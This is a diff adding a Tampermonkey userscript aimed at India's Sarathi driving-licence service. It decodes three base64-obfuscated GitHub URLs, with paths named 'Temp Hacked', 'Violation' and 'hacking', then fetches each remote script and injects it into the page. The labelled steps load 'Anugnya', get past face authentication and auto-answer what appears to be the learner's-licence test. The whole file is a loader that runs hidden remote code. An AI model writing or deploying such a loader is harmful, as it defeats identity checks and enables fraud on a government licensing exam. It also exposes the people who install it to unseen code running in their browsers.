@@ -1,0 +1,51 @@
+// ==UserScript==
+// @name         Unified LL Helper Script (Sequenced + DOM Fix)
+// @namespace    http://tampermonkey.net/
+// @version      1.1
+// @description  Load Anugnya → Face Auth (delayed) → Auto Answer in order with DOM handling
+// @author       -
+// @match        https://sarathi.parivahan.gov.in/sarathiservice/*
+// @grant        none
+// @run-at       document-start
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    const loadScriptFromEncodedURL = (encoded, label) => {
+        const url = atob(encoded);
+        return fetch(url)
+            .then(res => res.text())
+            .then(code => {
+                const script = document.createElement('script');
+                script.textContent = code;
+                document.documentElement.appendChild(script);
+                script.remove();
+                console.log(`[✔] ${label} script loaded`);
+            })
+            .catch(err => console.error(`[✘] Failed to load ${label} script:`, err));
+    };
+
+    // Step 1: Load Anugnya
+    loadScriptFromEncodedURL(
+        "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xsc29sdXRpb25hdXRvL2F1dGh0eXBlLUFudWdueWEvcmVmcy9oZWFkcy9tYWluL1RlbXAgSGFja2Vk",
+        "Anugnya"
+    ).then(() => {
+
+        // Step 2: Wait for DOMContentLoaded before loading Face Auth
+        document.addEventListener("DOMContentLoaded", () => {
+            loadScriptFromEncodedURL(
+                "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xsc29sdXRpb25hdXRvL1Zpb2xhdGlvbi9yZWZzL2hlYWRzL21haW4vRVJST1I=",
+                "Face Auth"
+            ).then(() => {
+
+                // Step 3: Load Auto Answer script
+                loadScriptFromEncodedURL(
+                    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xsc29sdXRpb25hdXRvL3RhbXBlci9yZWZzL2hlYWRzL21haW4vaGFja2luZw==",
+                    "Auto Answer"
+                );
+            });
+        });
+
+    });
+})();
